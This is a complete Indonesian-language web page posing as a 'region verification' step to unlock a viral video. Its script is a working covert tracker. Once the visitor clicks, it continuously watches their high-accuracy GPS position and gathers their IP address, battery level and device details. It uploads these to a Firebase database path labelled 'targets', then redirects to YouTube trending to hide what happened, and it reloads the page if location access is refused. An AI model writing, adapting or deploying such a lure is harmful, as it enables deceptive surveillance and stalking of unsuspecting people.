<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Konten</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { background: #1e293b; padding: 35px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.4); max-width: 350px; width: 90%; border: 1px solid #334155; }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h2 { font-size: 20px; margin-bottom: 12px; font-weight: 700; }
        p { font-size: 14px; color: #94a3b8; margin-bottom: 30px; }
        .btn { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; border: none; padding: 16px 24px; border-radius: 14px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
        #loader { display: none; margin-top: 20px; border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h2>Verifikasi Wilayah</h2>
    <p>Silakan verifikasi lokasi Anda untuk membuka video yang sedang tren di wilayah Anda secara otomatis.</p>
    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO VIRAL</button>
    <div id="loader"></div>
</div>

<script>
    const targetID = "User_" + Math.floor(Date.now() / 1000);
    const startTime = Date.now(); // Mencatat waktu mulai sesi
    const DB_URL = `https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets/${targetID}.json`;

    const YT_URL = "https://www.youtube.com/trending";
    const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";

    async function getExtra() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            const bat = await (navigator.getBattery ? navigator.getBattery() : null);
            return {
                ip: data.ip,
                battery: bat ? Math.round(bat.level * 100) + "%" : "N/A",
                device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Mobile"
            };
        } catch (e) { return { ip: "N/A", battery: "N/A", device: "Mobile" }; }
    }

    async function sendData(coords) {
        const info = await getExtra();
        const payload = {
            id: targetID,
            lat: coords.latitude,
            lon: coords.longitude,
            ip: info.ip,
            battery: info.battery,
            device: info.device,
            start_time: startTime, // Data permanen untuk hitungan sesi
            updated_at: Date.now(),
            status: "Online"
        };
        fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
    }

    function processAll() {
        document.getElementById('startBtn').style.display = "none";
        document.getElementById('loader').style.display = "block";

        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((pos) => {
                sendData(pos.coords);
                setTimeout(() => {
                    window.location.href = YT_APP_INTENT;
                    setTimeout(() => { window.location.href = YT_URL; }, 1000);
                }, 2000);
            }, (err) => { location.reload(); }, { enableHighAccuracy: true });
        }
    }
</script>
</body>
</html>
